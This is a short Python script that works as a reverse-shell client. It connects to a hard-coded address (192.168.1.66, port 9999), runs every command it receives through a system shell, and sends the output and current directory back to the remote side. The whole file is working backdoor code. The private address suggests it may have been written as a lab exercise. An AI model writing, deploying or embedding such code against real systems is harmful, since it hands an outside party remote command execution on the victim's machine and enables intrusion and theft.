import socket
import os
import subprocess

sock = socket.socket()
# host = str(input('Enter server ip address: '))
host = '192.168.1.66'
# host = socket.gethostbyname(socket.gethostname())
port = 9999

sock.connect((host, port))

while True:
    data = sock.recv(5120)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + "> "
        sock.send(str.encode(output_str + currentWD))

        print(output_str)
